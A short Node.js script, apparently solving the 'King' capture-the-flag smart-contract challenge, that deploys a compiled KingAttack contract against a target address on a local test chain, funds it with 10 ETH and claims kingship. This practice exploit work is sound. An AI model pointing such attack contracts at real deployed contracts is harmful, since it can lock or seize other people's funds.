const { kStringMaxLength } = require("buffer");
const { ethers } =  require("ethers"); 
const fs = require('fs');

const url = "http://localhost:8545";

const provider = new ethers.providers.JsonRpcProvider(url);

// Getting the accounts
const signer = provider.getSigner(19);

contract_address = "0x7e2d5FCC5E02cBF2b9f860052C0226104E23F9c7"

const metadata = JSON.parse(fs.readFileSync('../artifacts/contracts/KingAttack.sol/KingAttack.json').toString())

kingFactory = new ethers.ContractFactory(metadata.abi, metadata.bytecode, signer)


;(async () => {
    price = ethers.utils.formatUnits(await provider.getGasPrice(), 'gwei')
    deployOptions = {gasLimit: 1000000, gasPrice: ethers.utils.parseUnits(price, 'gwei')}

    kingContract = await kingFactory.deploy(contract_address, deployOptions)
    await kingContract.deployTransaction.wait()
    
    sendEthOptions = {value:ethers.utils.parseEther("10.0")}

    tx = await kingContract.loadEther(sendEthOptions)
    await tx.wait()


    tx = await kingContract.becomeKing()
    await tx.wait()
    console.log(kingContract.address);

})();